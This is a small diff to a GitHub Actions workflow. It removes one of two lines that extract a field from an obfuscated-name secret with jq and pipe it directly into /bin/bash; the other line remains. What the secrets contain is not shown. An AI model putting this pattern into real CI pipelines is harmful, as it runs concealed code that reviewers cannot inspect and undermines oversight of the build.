@@ -22,7 +22,6 @@ jobs:
           sy40666: ${{ secrets.sy40666 }}
         run: |
           printf '%s' "$sy40666" | jq -r .wjhdn11646 | /bin/bash
-          printf '%s' "$d08191" | jq -r .jaoj77351 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
